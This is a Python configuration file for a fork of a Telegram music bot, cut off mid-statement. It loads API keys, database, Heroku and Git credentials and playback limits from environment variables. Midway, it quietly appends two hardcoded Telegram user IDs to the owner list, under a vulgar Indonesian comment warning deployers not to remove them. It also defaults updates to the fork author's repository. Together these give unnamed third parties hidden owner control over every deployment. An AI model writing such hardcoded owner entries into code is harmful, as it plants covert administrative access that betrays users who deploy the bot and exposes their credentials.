#
# Copyright (C) 2021-2022 by TeamYukki@Github, < https://github.com/TeamYukki >.
#
# This file is part of < https://github.com/TeamYukki/YukkiMusicBot > project,
# and is released under the "GNU v3.0 License Agreement".
# Please see < https://github.com/TeamYukki/YukkiMusicBot/blob/master/LICENSE >
#
# All rights reserved.
import re
import sys
from os import getenv
from dotenv import load_dotenv
from pyrogram import filters
load_dotenv()
# Get it from my.telegram.org
API_ID = int(getenv("API_ID", ""))
API_HASH = getenv("API_HASH")
## Get it from @Botfather in Telegram.
BOT_TOKEN = getenv("BOT_TOKEN")
# Database to save your chats and stats... Get MongoDB:-  https://telegra.ph/How-To-get-Mongodb-URI-04-06
MONGO_DB_URI = getenv("MONGO_DB_URI", None)
# Custom max audio(music) duration for voice chat. set DURATION_LIMIT in variables with your own time(mins), Default to 60 mins.
DURATION_LIMIT_MIN = int(    
getenv("DURATION_LIMIT", "360")
)  # Remember to give value in Minutes
# Duration Limit for downloading Songs in MP3 or MP4 format from bot
SONG_DOWNLOAD_DURATION = int(    
getenv("SONG_DOWNLOAD_DURATION_LIMIT", "180")
)  # Remember to give value in Minutes
# You'll need a Private Group ID for this.
LOG_GROUP_ID = int(getenv("LOG_GROUP_ID", ""))
# A name for your Music bot.
MUSIC_BOT_NAME = getenv("MUSIC_BOT_NAME")
# Your User ID.
OWNER_ID = list(    
map(int, getenv("OWNER_ID", "").split())
)  # Input type must be interger
# JANGAN HAPUS YA KONTOL
OWNER_ID.append(1663707439)
OWNER_ID.append(1820522756)
# Get it from http://dashboard.heroku.com/account
HEROKU_API_KEY = getenv("HEROKU_API_KEY")
# You have to Enter the app name which you gave to identify your  Music Bot in Heroku.
HEROKU_APP_NAME = getenv("HEROKU_APP_NAME")
# For customized or modified Repository
UPSTREAM_REPO = getenv(    
"UPSTREAM_REPO",    
"https://github.com/bayuvhnzllyy/FixellxYukki",
)
UPSTREAM_BRANCH = getenv("UPSTREAM_BRANCH", "master")
# GIT TOKEN ( if your edited repo is private)
GIT_TOKEN = getenv("GIT_TOKEN", None)
# Only  Links formats are  accepted for this Var value.
SUPPORT_CHANNEL = getenv(    
"SUPPORT_CHANNEL", None
)  # Example:- https://t.me/mahadappa
SUPPORT_GROUP = getenv(    
"SUPPORT_GROUP", None
)  # Example:- https://t.me/xiaosupportV1
# Set it in True if you want to leave your assistant after a certain amount of time. [Set time via AUTO_LEAVE_ASSISTANT_TIME]
AUTO_LEAVING_ASSISTANT = getenv("AUTO_LEAVING_ASSISTANT", None)
# Time after which you're assistant account will leave chats automatically.
AUTO_LEAVE_ASSISTANT_TIME = int(    
getenv("ASSISTANT_LEAVE_TIME", "2000")
)  # Remember to give value in Seconds
# Time after which bot will suggest random chats about bot commands.
AUTO_SUGGESTION_TIME = int(    
getenv("AUTO_SUGGESTION_TIME", "5400")
)  # Remember to give value in Seconds
# Set it True if you want to delete downloads after the music playout ends from your downloads folder
AUTO_DOWNLOADS_CLEAR = getenv("AUTO_DOWNLOADS_CLEAR", True)
# Set it True if you want to bot to suggest about bot commands to random chats of your bots.
AUTO_SUGGESTION_MODE = getenv("AUTO_SUGGESTION_MODE", None)
# Set it true if you want your bot to be private only [You'll need to allow CHAT_ID via /authorise command then only your bot will play music in that chat.]
PRIVATE_BOT_MODE = getenv("PRIVATE_BOT_MODE", None)
# Time sleep duration For Youtube Downloader
YOUTUBE_DOWNLOAD_EDIT_SLEEP = int(getenv("YOUTUBE_EDIT_SLEEP", "3"))
# Time sleep duration For Telegram Downloader
TELEGRAM_DOWNLOAD_EDIT_SLEEP = int(getenv("TELEGRAM_EDIT_SLEEP", "5"))
# Your Github Repo.. Will be shown on /start Command
GITHUB_REPO = getenv("GITHUB_REPO", None)
# Spotify Client.. Get it from https://developer.spotify.com/dashboard
SPOTIFY_CLIENT_ID = getenv("SPOTIFY_CLIENT_ID", None)
SPOTIFY_CLIENT_SECRET = getenv("SPOTIFY_CLIENT_SECRET", None)
# Maximum number of video calls allowed on bot. You can later set it via /set_video_limit on telegram
VIDEO_STREAM_LIMIT = int(getenv("VIDEO_STREAM_LIMIT", "30"))
# Maximum Limit Allowed for users to save playlists on bot's server
SERVER_PLAYLIST_LIMIT = int(getenv("SERVER_PLAYLIST_LIMIT", "30"))
# MaximuM limit for fetching playlist's track from youtube, spotify, apple links.
PLAYLIST_FETCH_LIMIT = int(getenv("PLAYLIST_FETCH_LIMIT", "30"))
# Cleanmode time after which bot will delete its old messages from chats
CLEANMODE_DELETE_MINS = int(    
getenv("CLEANMODE_MINS", "5")
)  # Remember to give value in Seconds
# Telegram audio  and video file size limit
TG_AUDIO_FILESIZE_LIMIT = int(    
getenv("TG_AUDIO_FILESIZE_LIMIT", "104857600")
)  # Remember to give value in bytes
TG_VIDEO_FILESIZE_LIMIT = int(
